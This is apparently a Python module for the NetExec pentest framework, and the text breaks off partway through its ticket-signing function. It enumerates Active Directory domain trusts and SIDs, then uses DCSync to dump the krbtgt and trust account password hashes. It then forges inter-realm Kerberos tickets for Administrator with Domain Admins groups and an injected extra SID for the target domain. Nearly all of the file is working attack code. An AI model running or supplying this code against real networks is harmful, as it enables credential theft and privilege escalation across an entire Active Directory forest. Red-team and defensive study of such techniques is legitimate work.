import os
import datetime
import re
from contextlib import suppress
from calendar import timegm
from binascii import unhexlify
from pyasn1.codec.der import encoder
from pyasn1.type.univ import noValue
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.dcerpc.v5.drsuapi import DCERPCSessionError
from impacket.krb5.asn1 import AS_REP, EncTicketPart, EncASRepPart, AuthorizationData
from impacket.krb5.types import KerberosTime
from impacket.krb5.constants import ApplicationTagNumbers, ProtocolVersionNumber, PrincipalNameType, TicketFlags, AuthorizationDataType, EncryptionTypes, ChecksumTypes, KERB_NON_KERB_CKSUM_SALT, encodeFlags
from impacket.krb5.crypto import Key, _enctype_table, _checksum_table
from impacket.krb5.ccache import CCache
from impacket.krb5.pac import VALIDATION_INFO, KERB_VALIDATION_INFO, PAC_LOGON_INFO, PAC_CLIENT_INFO, PAC_CLIENT_INFO_TYPE, PAC_REQUESTOR, PAC_REQUESTOR_INFO, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM, PAC_SIGNATURE_DATA, PAC_INFO_BUFFER, PACTYPE, PKERB_SID_AND_ATTRIBUTES_ARRAY, KERB_SID_AND_ATTRIBUTES
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.samr import GROUP_MEMBERSHIP, SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
from impacket.dcerpc.v5.dtypes import SID, RPC_SID, NULL
from nxc.parsers.ldap_results import parse_result_attributes
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Comprehensive Domain Trust Enumeration Module
    
    This module performs the following operations:
    1. Enumerates all trust relationships (parent/child domains)
    2. Displays domain SIDs for all trusted domains
    3. Extracts krbtgt account hash from NTDS
    4. Extracts trust account hashes from NTDS
    
    Module created for comprehensive domain trust analysis
    """

    name = "trust-enum"
    description = "Enumerate domain trusts, SIDs, krbtgt and trust account hashes"
    supported_protocols = ["ldap"]
    category = CATEGORY.ENUMERATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.current_domain_sid = None
        self.current_domain_name = None
        self.trust_data = []
        self.krbtgt_hash = None
        self.trust_hashes = []
        self.trust_hash_mapping = {}  # Maps trust domain name to hash

    def options(self, context, module_options):
        """
        NO_HASHES    Skip extracting krbtgt and trust hashes from NTDS (only enumerate trusts and SIDs)
        
        Examples:
        netexec ldap <ip> -u <username> -p <password> -M trust-enum
        netexec ldap <ip> -u <username> -p <password> -M trust-enum -o NO_HASHES=True
        """
        self.context = context
        self.module_options = module_options
        self.skip_hashes = module_options.get("NO_HASHES", False)

    def on_admin_login(self, context, connection):
        """Execute the trust enumeration on successful admin login"""
        self.context = context
        
        context.log.display("=" * 70)
        context.log.display("DOMAIN TRUST ENUMERATION MODULE")
        context.log.display("=" * 70)
        
        # Step 1: Get current domain information
        self._get_current_domain_info(connection)
        
        # Step 2: Enumerate trust relationships
        self._enumerate_trusts(connection)
        
        # Step 3: Display trust summary
        self._display_trust_summary()
        
        # Step 4: Extract hashes if requested
        if not self.skip_hashes:
            context.log.display("")
            context.log.display("=" * 70)
            context.log.display("EXTRACTING SENSITIVE HASHES FROM NTDS")
            context.log.display("=" * 70)
            self._extract_hashes(connection)
            self._display_hash_summary()
            
            # Step 5: Forge inter-realm tickets for forest domains
            context.log.display("")
            context.log.display("=" * 70)
            context.log.display("FORGING INTER-REALM TICKETS FOR FOREST DOMAINS")
            context.log.display("=" * 70)
            self._forge_trust_tickets(connection)
        
        context.log.display("")
        context.log.display("=" * 70)
        context.log.display("TRUST ENUMERATION COMPLETE")
        context.log.display("=" * 70)

    def _get_current_domain_info(self, connection):
        """Get current domain name and SID"""
        self.current_domain_name = connection.domain
        self.current_domain_sid = connection.sid_domain
        
        self.context.log.display("")
        self.context.log.highlight("[*] CURRENT DOMAIN INFORMATION:")
        self.context.log.success(f"    Domain Name: {self.current_domain_name}")
        if self.current_domain_sid:
            self.context.log.success(f"    Domain SID:  {self.current_domain_sid}")
            self.context.log.highlight(f"    {self.current_domain_name}:{self.current_domain_sid}")
        else:
            self.context.log.fail("    Could not retrieve current domain SID")

    def _enumerate_trusts(self, connection):
        """Enumerate all trust relationships"""
        self.context.log.display("")
        self.context.log.highlight("[*] ENUMERATING TRUST RELATIONSHIPS:")
        
        base_dn = f"CN=System,{connection.baseDN}"
        attributes = ["name", "trustPartner", "securityIdentifier", "trustDirection", 
                     "trustType", "trustAttributes", "flatName"]
        
        try:
            response = connection.search(
                searchFilter="(objectClass=trustedDomain)",
                attributes=attributes,
                baseDN=base_dn,
            )
            trusts = parse_result_attributes(response)
            
            if not trusts:
                self.context.log.display("    No trust relationships found")
                return
            
            self.context.log.success(f"    Found {len(trusts)} trust relationship(s)")
            self.context.log.display("")
            
            for idx, trust in enumerate(trusts, 1):
                trust_info = self._parse_trust_data(trust)
                self.trust_data.append(trust_info)
                self._display_trust_details(idx, trust_info)
                
        except Exception as e:
            self.context.log.fail(f"Failed to enumerate trusts: {e}")

    def _parse_trust_data(self, trust):
        """Parse trust data from LDAP response"""
        trust_name = trust.get("name", "Unknown")
        trust_partner = trust.get("trustPartner", trust_name)
        trust_flat_name = trust.get("flatName", "")
        trust_direction = int(trust.get("trustDirection", 0))
        trust_type = int(trust.get("trustType", 0))
        trust_attributes = int(trust.get("trustAttributes", 0))
        
        # Convert SID from binary to string format
        trust_sid = None
        raw_sid = trust.get("securityIdentifier")
        if raw_sid:
            try:
                revision = raw_sid[0]
                count = raw_sid[1]
                id_auth = int.from_bytes(raw_sid[2:8], byteorder="big")
                sub_auths = [
                    str(int.from_bytes(raw_sid[8 + i * 4 : 12 + i * 4], byteorder="little"))
                    for i in range(count)
                ]
                trust_sid = f"S-{revision}-{id_auth}-" + "-".join(sub_auths)
            except Exception as e:
                self.context.log.debug(f"Failed to convert trust SID: {e}")
        
        # Determine trust relationship type (parent/child/external)
        relationship_type = "Unknown"
        if trust_type == 2:  # Active Directory trust
            if trust_attributes & 0x20:  # Within Forest
                # Check if parent or child
                if trust_sid and self.current_domain_sid:
                    # Parent domain has fewer RID components
                    current_parts = self.current_domain_sid.split("-")
                    trust_parts = trust_sid.split("-")
                    if len(trust_parts) < len(current_parts):
                        relationship_type = "Parent Domain"
                    elif len(trust_parts) > len(current_parts):
                        relationship_type = "Child Domain"
                    else:
                        relationship_type = "Same Level Domain"
            else:
                relationship_type = "External Domain"
        
        return {
            "name": trust_partner,
            "flat_name": trust_flat_name,
            "sid": trust_sid,
            "direction": trust_direction,
            "type": trust_type,
            "attributes": trust_attributes,
            "relationship": relationship_type,
        }

    def _display_trust_details(self, idx, trust_info):
        """Display detailed trust information"""
        # Trust direction mapping
        direction_map = {
            0: "Disabled",
            1: "Inbound (This domain trusts the trusted domain)",
            2: "Outbound (The trusted domain trusts this domain)",
            3: "Bidirectional (Two-way trust)",
        }
        
        # Trust type mapping
        type_map = {
            1: "Windows NT (Downlevel)",
            2: "Active Directory (Uplevel)",
            3: "Kerberos (MIT)",
            4: "DCE",
            5: "Azure Active Directory",
        }
        
        # Trust attributes flags
        attribute_flags = {
            0x1: "Non-Transitive",
            0x2: "Uplevel-Only",
            0x4: "Quarantined Domain",
            0x8: "Forest Transitive",
            0x10: "Cross Organization",
            0x20: "Within Forest",
            0x40: "Treat as External",
            0x80: "Uses RC4 Encryption",
            0x200: "Cross Organization No TGT Delegation",
            0x800: "Cross Organization Enable TGT Delegation",
            0x2000: "PAM Trust",
        }
        
        self.context.log.highlight(f"    ┌─ TRUST {idx} ─────────────────────────────────────")
        self.context.log.success(f"    │ Domain Name:      {trust_info['name']}")
        if trust_info['flat_name']:
            self.context.log.success(f"    │ NetBIOS Name:     {trust_info['flat_name']}")
        
        # Display Domain:SID format prominently
        if trust_info['sid']:
            self.context.log.success(f"    │ Domain SID:       {trust_info['sid']}")
            self.context.log.highlight(f"    │ >>> {trust_info['name']}:{trust_info['sid']}")
        else:
            self.context.log.fail(f"    │ Domain SID:       Not available")
        
        self.context.log.success(f"    │ Relationship:     {trust_info['relationship']}")
        self.context.log.success(f"    │ Direction:        {direction_map.get(trust_info['direction'], 'Unknown')}")
        self.context.log.success(f"    │ Type:             {type_map.get(trust_info['type'], 'Unknown')}")
        
        # Display trust attributes
        attributes_list = [
            text for flag, text in attribute_flags.items()
            if trust_info['attributes'] & flag
        ]
        if attributes_list:
            self.context.log.success(f"    │ Attributes:       {', '.join(attributes_list)}")
        else:
            self.context.log.success(f"    │ Attributes:       None or Unknown")
        
        self.context.log.highlight(f"    └────────────────────────────────────────────────────")
        self.context.log.display("")

    def _display_trust_summary(self):
        """Display a summary of all trust relationships"""
        if not self.trust_data:
            return
        
        self.context.log.display("")
        self.context.log.highlight("[*] TRUST RELATIONSHIP SUMMARY:")
        self.context.log.display("")
        
        # Display a visual representation of trust relationships
        self.context.log.highlight(f"    Current Domain: {self.current_domain_name}")
        self.context.log.display("")
        
        for trust in self.trust_data:
            direction_symbol = {
                1: "<--",  # Inbound
                2: "-->",  # Outbound
                3: "<->",  # Bidirectional
                0: "---",  # Disabled
            }.get(trust['direction'], "???")
            
            self.context.log.success(f"    {self.current_domain_name} {direction_symbol} {trust['name']} ({trust['relationship']})")
        
        self.context.log.display("")
        self.context.log.highlight("[*] DOMAIN:SID MAPPINGS:")
        self.context.log.display("")
        self.context.log.highlight(f"    {self.current_domain_name}:{self.current_domain_sid}")
        for trust in self.trust_data:
            if trust['sid']:
                self.context.log.highlight(f"    {trust['name']}:{trust['sid']}")

    def _extract_hashes(self, connection):
        """Extract krbtgt and trust account hashes from NTDS"""
        try:
            # Create SMB connection for DCSync
            smb_conn = self._get_smb_session(connection)
            self._dcsync_special_accounts(smb_conn, connection)
        except Exception as e:
            self.context.log.fail(f"Error during hash extraction: {e}")

    def _get_smb_session(self, ldap_conn):
        """Create SMB session from LDAP connection"""
        smb = SMBConnection(
            remoteName=ldap_conn.hostname,
            remoteHost=ldap_conn.host,
            sess_port=445,
        )

        if ldap_conn.kerberos:
            smb.kerberosLogin(
                user=ldap_conn.username,
                password=ldap_conn.password,
                domain=ldap_conn.domain,
                lmhash=ldap_conn.lmhash,
                nthash=ldap_conn.nthash,
                aesKey=ldap_conn.aesKey,
                kdcHost=ldap_conn.kdcHost,
                useCache=ldap_conn.use_kcache,
            )
        elif ldap_conn.nthash or ldap_conn.lmhash:
            smb.login(ldap_conn.username, "", ldap_conn.domain, 
                     lmhash=ldap_conn.lmhash, nthash=ldap_conn.nthash)
        else:
            smb.login(ldap_conn.username, ldap_conn.password, ldap_conn.domain)
        
        return smb

    def _dcsync_special_accounts(self, smb_conn, ldap_conn):
        """Extract krbtgt and trust account hashes via DCSync"""
        try:
            rop = RemoteOperations(
                smb_conn,
                doKerberos=ldap_conn.kerberos,
                kdcHost=ldap_conn.kdcHost,
            )
            rop.enableRegistry()
            rop.getDrsr()
            boot_key = rop.getBootKey()

            self.context.log.display("    Starting DCSync to extract sensitive hashes...")
            
            # Callback to capture hashes
            def grab_hash(secret_type, secret):
                secret_lower = secret.lower()
                
                # Capture krbtgt hash
                if "krbtgt:" in secret_lower:
                    self.krbtgt_hash = secret
                    self.context.log.highlight(f"    [KRBTGT] {secret}")
                
                # Capture trust account hashes
                # Trust accounts end with $ and match trusted domain names
                # Format is typically: DOMAIN\TRUSTEDDOMAIN$:...
                elif "$:" in secret:
                    # Extract the account name (part before the colon)
                    account_part = secret.split(":")[0] if ":" in secret else secret
                    # Get just the username part (after \ if present)
                    username = account_part.split("\\")[-1] if "\\" in account_part else account_part
                    
                    # Check if username matches any trust domain (case-insensitive)
                    # Trust accounts are named after the trusted domain
                    for trust in self.trust_data:
                        trust_names = []
                        if trust['flat_name']:
                            trust_names.append(trust['flat_name'].lower())
                        if trust['name']:
                            # Add both full domain and first part (e.g., "child" from "child.parent.com")
                            trust_names.append(trust['name'].lower())
                            trust_names.append(trust['name'].lower().split('.')[0])
                        
                        # Check if the account name (without $) matches a trust domain
                        username_base = username.rstrip('$').lower()
                        if username_base in trust_names or any(name in username_base for name in trust_names):
                            self.trust_hashes.append(secret)
                            # Store mapping for ticket forging
                            self.trust_hash_mapping[trust['name']] = secret
                            self.context.log.highlight(f"    [TRUST] {secret}")
                            break

            ntds = NTDSHashes(
                None,
                boot_key,
                isRemote=True,
                noLMHash=True,
                remoteOps=rop,
                justNTLM=True,
                printUserStatus=False,
                perSecretCallback=grab_hash,
            )
            ntds.dump()

        except DCERPCSessionError as e:
            self.context.log.fail(f"    RPC DRSUAPI error: {e}")
        except Exception as e:
            self.context.log.fail(f"    DCSync error: {e}")
        finally:
            with suppress(Exception):
                if 'ntds' in locals():
                    ntds.finish()
            with suppress(Exception):
                if 'rop' in locals():
                    rop.finish()
            with suppress(Exception):
                smb_conn.logoff()

    def _display_hash_summary(self):
        """Display summary of extracted hashes"""
        self.context.log.display("")
        self.context.log.highlight("[*] HASH EXTRACTION SUMMARY:")
        self.context.log.display("")
        
        if self.krbtgt_hash:
            self.context.log.success("    ✓ krbtgt hash extracted successfully")
            self.context.log.highlight(f"    krbtgt: {self.krbtgt_hash}")
        else:
            self.context.log.fail("    ✗ krbtgt hash not found")
        
        self.context.log.display("")
        
        if self.trust_hashes:
            self.context.log.success(f"    ✓ {len(self.trust_hashes)} trust account hash(es) extracted:")
            for trust_hash in self.trust_hashes:
                self.context.log.highlight(f"    {trust_hash}")
        else:
            self.context.log.fail("    ✗ No trust account hashes found")

    def _forge_trust_tickets(self, connection):
        """Forge inter-realm tickets for domains within the forest"""
        self.context.log.display("")
        self.context.log.display("    Forging inter-realm tickets for forest domains...")
        
        # Filter trusts that are within the forest
        forest_trusts = [
            trust for trust in self.trust_data
            if trust['type'] == 2 and (trust['attributes'] & 0x20)  # Active Directory + Within Forest
        ]
        
        if not forest_trusts:
            self.context.log.display("    No forest trusts found to forge tickets for")
            return
        
        self.context.log.success(f"    Found {len(forest_trusts)} forest trust(s)")
        self.context.log.display("")
        
        forged_tickets = []
        for trust in forest_trusts:
            # Check if we have the trust hash
            if trust['name'] not in self.trust_hash_mapping:
                self.context.log.fail(f"    ✗ No trust hash found for {trust['name']}, skipping")
                continue
            
            if not trust['sid']:
                self.context.log.fail(f"    ✗ No SID found for {trust['name']}, skipping")
                continue
            
            self.context.log.display(f"    [+] Forging ticket for {trust['name']}...")
            
            try:
                ticket_path = self._forge_inter_realm_ticket(
                    connection,
                    trust['name'],
                    trust['sid'],
                    self.trust_hash_mapping[trust['name']]
                )
                
                if ticket_path:
                    forged_tickets.append((trust['name'], ticket_path))
                    self.context.log.success(f"    ✓ Ticket saved to: {ticket_path}")
            except Exception as e:
                self.context.log.fail(f"    ✗ Failed to forge ticket for {trust['name']}: {e}")
        
        # Display summary
        self.context.log.display("")
        self.context.log.highlight("[*] INTER-REALM TICKET SUMMARY:")
        self.context.log.display("")
        
        if forged_tickets:
            self.context.log.success(f"    ✓ {len(forged_tickets)} ticket(s) forged successfully:")
            for domain, path in forged_tickets:
                self.context.log.highlight(f"    {domain} -> {path}")
                self.context.log.success(f"    Use with: export KRB5CCNAME={path}")
        else:
            self.context.log.fail("    ✗ No tickets were forged")

    def _forge_inter_realm_ticket(self, connection, target_domain, target_sid, trust_hash):
        """
        Forge an inter-realm ticket using the trust hash.
        Creates a ticket with Domain Admins (512) group membership and target domain SID as extra SID.
        """
        # Clean the NT hash from the trust hash string
        nthash = self._clean_nthash(trust_hash)
        
        # Configuration
        admin_name = "Administrator"
        user_rid = 500
        
        # Groups to add the user to (including Domain Admins = 512)
        groups_list = [513, 512, 520, 518, 519]
        
        # Extra SID: Domain Admins in the target domain
        extra_sid = f"{target_sid}-512"
        
        domain_upper = connection.domain.upper()
        target_domain_upper = target_domain.upper()
        
        # Create ticket using the trust hash as the key
        enctype_value = EncryptionTypes.rc4_hmac.value
        trust_key = Key(_enctype_table[enctype_value].enctype, unhexlify(nthash))
        
        # Create PAC with current domain info but inject target domain SID
        validation_info = self._createBasicValidationInfo(
            admin_name, domain_upper, self.current_domain_sid, groups_list, user_rid
        )
        pac_infos = self._createBasicPac(validation_info, admin_name)
        self._createRequestorInfoPac(pac_infos, self.current_domain_sid, user_rid)
        
        # Build the AS-REP structure for inter-realm ticket
        # The service name must be krbtgt/TARGET_DOMAIN for inter-realm tickets
        as_rep = self._buildAsrepInterRealm(domain_upper, target_domain_upper, admin_name, enctype_value)
        enc_asrep_part, enc_ticket_part, pac_infos = self._buildEncParts(
            as_rep, domain_upper, admin_name, 87600, enctype_value, pac_infos
        )
        
        # Inject the extra SID for the target domain
        self._injectExtraSids(pac_infos, extra_sid)
        
        # Sign and encrypt the ticket
        encoded_asrep, client_session_key = self._signEncryptTicket(
            as_rep, enc_asrep_part, enc_ticket_part, pac_infos, trust_key, enctype_value
        )
        
        # Save the ticket
        ticket_filename = f"{target_domain.replace('.', '_')}_admin.ccache"
        return self._saveTicket(ticket_filename, encoded_asrep, client_session_key)

    def _clean_nthash(self, raw):
        """Extract NT hash from secretsdump format"""
        if ":" in raw:
            parts = raw.split(":")
            if len(parts) >= 4:
                raw = parts[3]
        raw = raw.strip()
        if not re.fullmatch(r"[0-9a-fA-F]{32}", raw):
            raise ValueError(f"Invalid NT-hash format: {raw}")
        return raw.lower()

    # Ticket forging methods adapted from raisechild module
    @staticmethod
    def _getFileTime(unix_seconds: int) -> int:
        return unix_seconds * 10_000_000 + 116_444_736_000_000_000

    @staticmethod
    def _getPadLength(length: int) -> int:
        return ((length + 7) // 8 * 8) - length

    @staticmethod
    def _getBlockLength(length: int) -> int:
        return (length + 7) // 8 * 8

    def _createBasicValidationInfo(self, username: str, domain: str, domain_sid: str, groups: list[int], user_rid: int) -> VALIDATION_INFO:
        kerbdata = KERB_VALIDATION_INFO()

        now_utc = datetime.datetime.now(datetime.timezone.utc)
        now_unix = timegm(now_utc.timetuple())
        now_filetime = self._getFileTime(now_unix)

        kerbdata["LogonTime"]["dwLowDateTime"] = now_filetime & 0xFFFFFFFF
        kerbdata["LogonTime"]["dwHighDateTime"] = now_filetime >> 32
        kerbdata["LogoffTime"]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata["LogoffTime"]["dwHighDateTime"] = 0x7FFFFFFF
        kerbdata["KickOffTime"]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata["KickOffTime"]["dwHighDateTime"] = 0x7FFFFFFF

        kerbdata["PasswordLastSet"]["dwLowDateTime"] = now_filetime & 0xFFFFFFFF
        kerbdata["PasswordLastSet"]["dwHighDateTime"] = now_filetime >> 32
        kerbdata["PasswordCanChange"]["dwLowDateTime"] = 0
        kerbdata["PasswordCanChange"]["dwHighDateTime"] = 0
        kerbdata["PasswordMustChange"]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata["PasswordMustChange"]["dwHighDateTime"] = 0x7FFFFFFF

        kerbdata["EffectiveName"] = username
        kerbdata["FullName"] = ""
        kerbdata["LogonScript"] = ""
        kerbdata["ProfilePath"] = ""
        kerbdata["HomeDirectory"] = ""
        kerbdata["HomeDirectoryDrive"] = ""
        kerbdata["LogonCount"] = 500
        kerbdata["BadPasswordCount"] = 0
        kerbdata["UserId"] = int(user_rid)

        primary_group_id = int(groups[0]) if groups else 513
        kerbdata["PrimaryGroupId"] = primary_group_id
        kerbdata["GroupCount"] = len(groups)
        for group_rid in (groups or [513]):
            membership = GROUP_MEMBERSHIP()
            ndr_rid = NDRULONG()
            ndr_rid["Data"] = int(group_rid)
            membership["RelativeId"] = ndr_rid
            membership["Attributes"] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata["GroupIds"].append(membership)

        kerbdata["UserFlags"] = 0
        kerbdata["UserSessionKey"] = b"\x00" * 16
        kerbdata["LogonServer"] = ""
        kerbdata["LogonDomainName"] = domain
        kerbdata["LogonDomainId"].fromCanonical(domain_sid)
        kerbdata["LMKey"] = b"\x00" * 8
        kerbdata["UserAccountControl"] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        kerbdata["SubAuthStatus"] = 0

        kerbdata["LastSuccessfulILogon"]["dwLowDateTime"] = 0
        kerbdata["LastSuccessfulILogon"]["dwHighDateTime"] = 0
        kerbdata["LastFailedILogon"]["dwLowDateTime"] = 0
        kerbdata["LastFailedILogon"]["dwHighDateTime"] = 0
        kerbdata["FailedILogonCount"] = 0
        kerbdata["Reserved3"] = 0

        kerbdata["ResourceGroupDomainSid"] = NULL
        kerbdata["ResourceGroupCount"] = 0
        kerbdata["ResourceGroupIds"] = NULL

        validation_info = VALIDATION_INFO()
        validation_info["Data"] = kerbdata
        return validation_info

    def _createBasicPac(self, validation_info: VALIDATION_INFO, username: str) -> dict:
        pac_infos: dict[int, bytes] = {}
        pac_infos[PAC_LOGON_INFO] = validation_info.getData() + validation_info.getDataReferents()

        server_checksum_placeholder = PAC_SIGNATURE_DATA()
        private_checksum_placeholder = PAC_SIGNATURE_DATA()
        server_checksum_placeholder["SignatureType"] = ChecksumTypes.hmac_md5.value
        private_checksum_placeholder["SignatureType"] = ChecksumTypes.hmac_md5.value
        server_checksum_placeholder["Signature"] = b"\x00" * 16
        private_checksum_placeholder["Signature"] = b"\x00" * 16
        pac_infos[PAC_SERVER_CHECKSUM] = server_checksum_placeholder.getData()
        pac_infos[PAC_PRIVSVR_CHECKSUM] = private_checksum_placeholder.getData()

        client_info = PAC_CLIENT_INFO()
        client_name_utf16 = username.encode("utf-16le")
        client_info["Name"] = client_name_utf16
        client_info["NameLength"] = len(client_name_utf16)
        pac_infos[PAC_CLIENT_INFO_TYPE] = client_info.getData()

        return pac_infos

    def _createRequestorInfoPac(self, pac_infos: dict, domain_sid: str, user_rid: int) -> None:
        requestor = PAC_REQUESTOR()
        requestor["UserSid"] = SID()
        requestor["UserSid"].fromCanonical(f"{domain_sid}-{int(user_rid)}")
        pac_infos[PAC_REQUESTOR_INFO] = requestor.getData()

    def _buildAsrep(self, domain: str, username: str, enctype_value: int) -> AS_REP:
        as_rep = AS_REP()
        as_rep["msg-type"] = ApplicationTagNumbers.AS_REP.value
        as_rep["pvno"] = 5

        as_rep["crealm"] = domain
        as_rep["cname"] = noValue
        as_rep["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
        as_rep["cname"]["name-string"] = noValue
        as_rep["cname"]["name-string"][0] = username

        as_rep["ticket"] = noValue
        as_rep["ticket"]["tkt-vno"] = ProtocolVersionNumber.pvno.value
        as_rep["ticket"]["realm"] = domain
        as_rep["ticket"]["sname"] = noValue
        as_rep["ticket"]["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
        as_rep["ticket"]["sname"]["name-string"] = noValue
        as_rep["ticket"]["sname"]["name-string"][0] = "krbtgt"
        as_rep["ticket"]["sname"]["name-string"][1] = domain

        as_rep["ticket"]["enc-part"] = noValue
        as_rep["ticket"]["enc-part"]["kvno"] = 2
        as_rep["ticket"]["enc-part"]["etype"] = enctype_value

        as_rep["enc-part"] = noValue
        as_rep["enc-part"]["kvno"] = 2
        as_rep["enc-part"]["etype"] = enctype_value
        as_rep["enc-part"]["cipher"] = noValue
        return as_rep

    def _buildAsrepInterRealm(self, source_domain: str, target_domain: str, username: str, enctype_value: int) -> AS_REP:
        """Build AS-REP for inter-realm ticket (referral ticket)"""
        as_rep = AS_REP()
        as_rep["msg-type"] = ApplicationTagNumbers.AS_REP.value
        as_rep["pvno"] = 5

        as_rep["crealm"] = source_domain
        as_rep["cname"] = noValue
        as_rep["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
        as_rep["cname"]["name-string"] = noValue
        as_rep["cname"]["name-string"][0] = username

        as_rep["ticket"] = noValue
        as_rep["ticket"]["tkt-vno"] = ProtocolVersionNumber.pvno.value
        # For inter-realm tickets, the realm should be the source domain
        as_rep["ticket"]["realm"] = source_domain
        as_rep["ticket"]["sname"] = noValue
        as_rep["ticket"]["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
        as_rep["ticket"]["sname"]["name-string"] = noValue
        as_rep["ticket"]["sname"]["name-string"][0] = "krbtgt"
        # The service instance is the target domain
        as_rep["ticket"]["sname"]["name-string"][1] = target_domain

        as_rep["ticket"]["enc-part"] = noValue
        as_rep["ticket"]["enc-part"]["kvno"] = 2
        as_rep["ticket"]["enc-part"]["etype"] = enctype_value

        as_rep["enc-part"] = noValue
        as_rep["enc-part"]["kvno"] = 2
        as_rep["enc-part"]["etype"] = enctype_value
        as_rep["enc-part"]["cipher"] = noValue
        return as_rep

    def _injectExtraSids(self, pac_infos: dict, extra_sid_csv: str | None) -> None:
        if not extra_sid_csv or PAC_LOGON_INFO not in pac_infos:
            return

        current_blob = pac_infos[PAC_LOGON_INFO]
        validation_info = VALIDATION_INFO()
        validation_info.fromString(current_blob)
        base_len = len(validation_info.getData())
        validation_info.fromStringReferents(current_blob, base_len)

        validation_info["Data"]["UserFlags"] |= 0x20  # LOGON_EXTRA_SIDS

        if validation_info["Data"]["SidCount"] == 0 or not validation_info["Data"]["ExtraSids"]:
            validation_info["Data"]["ExtraSids"] = PKERB_SID_AND_ATTRIBUTES_ARRAY()
            validation_info["Data"]["SidCount"] = 0

        for sid_txt in str(extra_sid_csv).split(","):
            sid_txt = sid_txt.strip()
            if not sid_txt:
                continue
            sid_and_attr = KERB_SID_AND_ATTRIBUTES()
            rpc_sid = RPC_SID()
            rpc_sid.fromCanonical(sid_txt)
            sid_and_attr["Sid"] = rpc_sid
            sid_and_attr["Attributes"] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            validation_info["Data"]["ExtraSids"].append(sid_and_attr)
            validation_info["Data"]["SidCount"] += 1

        pac_infos[PAC_LOGON_INFO] = validation_info.getData() + validation_info.getDataReferents()

    def _buildEncParts(self, as_rep: AS_REP, domain: str, username: str, duration_hours: int,
                            enctype_value: int, pac_infos: dict) -> tuple[EncASRepPart, EncTicketPart, dict]:
        now_utc = datetime.datetime.now(datetime.timezone.utc)
        end_utc = now_utc + datetime.timedelta(hours=duration_hours)

        enc_ticket_part = EncTicketPart()
        enc_ticket_part["flags"] = encodeFlags([
            TicketFlags.forwardable.value,
            TicketFlags.proxiable.value,
            TicketFlags.renewable.value,
            TicketFlags.pre_authent.value,
            TicketFlags.initial.value,
        ])

        enc_ticket_part["key"] = noValue
        enc_ticket_part["key"]["keytype"] = enctype_value
        enc_ticket_part["key"]["keyvalue"] = os.urandom(16)  # RC4 -> 16 bytes

        enc_ticket_part["crealm"] = domain
        enc_ticket_part["cname"] = noValue
        enc_ticket_part["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
        enc_ticket_part["cname"]["name-string"] = noValue
        enc_ticket_part["cname"]["name-string"][0] = username

        enc_ticket_part["transited"] = noValue
        enc_ticket_part["transited"]["tr-type"] = 0
        enc_ticket_part["transited"]["contents"] = ""

        enc_ticket_part["authtime"] = KerberosTime.to_asn1(now_utc)
        enc_ticket_part["starttime"] = KerberosTime.to_asn1(now_utc)
        enc_ticket_part["endtime"] = KerberosTime.to_asn1(end_utc)
        enc_ticket_part["renew-till"] = KerberosTime.to_asn1(end_utc)

        enc_ticket_part["authorization-data"] = noValue
        enc_ticket_part["authorization-data"][0] = noValue
        enc_ticket_part["authorization-data"][0]["ad-type"] = AuthorizationDataType.AD_IF_RELEVANT.value
        enc_ticket_part["authorization-data"][0]["ad-data"] = noValue

        if PAC_CLIENT_INFO_TYPE in pac_infos:
            client_id_filetime = self._getFileTime(timegm(now_utc.timetuple()))
            pac_client_info = PAC_CLIENT_INFO(pac_infos[PAC_CLIENT_INFO_TYPE])
            pac_client_info["ClientId"] = client_id_filetime
            pac_infos[PAC_CLIENT_INFO_TYPE] = pac_client_info.getData()

        enc_asrep_part = EncASRepPart()
        enc_asrep_part["key"] = noValue
        enc_asrep_part["key"]["keytype"] = enctype_value
        enc_asrep_part["key"]["keyvalue"] = enc_ticket_part["key"]["keyvalue"]
        enc_asrep_part["last-req"] = noValue
        enc_asrep_part["last-req"][0] = noValue
        enc_asrep_part["last-req"][0]["lr-type"] = 0
        enc_asrep_part["last-req"][0]["lr-value"] = KerberosTime.to_asn1(now_utc)
        enc_asrep_part["nonce"] = 123456789
        enc_asrep_part["key-expiration"] = KerberosTime.to_asn1(end_utc)
        enc_asrep_part["flags"] = list(enc_ticket_part["flags"])
        enc_asrep_part["authtime"] = str(enc_ticket_part["authtime"])
        enc_asrep_part["endtime"] = str(enc_ticket_part["endtime"])
        enc_asrep_part["starttime"] = str(enc_ticket_part["starttime"])
        enc_asrep_part["renew-till"] = str(enc_ticket_part["renew-till"])
        # Copy the service realm and name from the as_rep ticket
        enc_asrep_part["srealm"] = str(as_rep["ticket"]["realm"])
        enc_asrep_part["sname"] = noValue
        enc_asrep_part["sname"]["name-type"] = as_rep["ticket"]["sname"]["name-type"]
        enc_asrep_part["sname"]["name-string"] = noValue
        enc_asrep_part["sname"]["name-string"][0] = str(as_rep["ticket"]["sname"]["name-string"][0])
        enc_asrep_part["sname"]["name-string"][1] = str(as_rep["ticket"]["sname"]["name-string"][1])

        return enc_asrep_part, enc_ticket_part, pac_infos

    def _signEncryptTicket(self, as_rep: AS_REP, enc_asrep_part: EncASRepPart, enc_ticket_part: EncTicketPart, pac_infos: dict, trust_key: Key, enctype_value: int) -> tuple[bytes, Key]:
        def zero_pad(n: int) -> bytes: return b"\x00" * self._getPadLength(n)

        pac_buffer_order = [PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE, PAC_REQUESTOR_INFO, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]

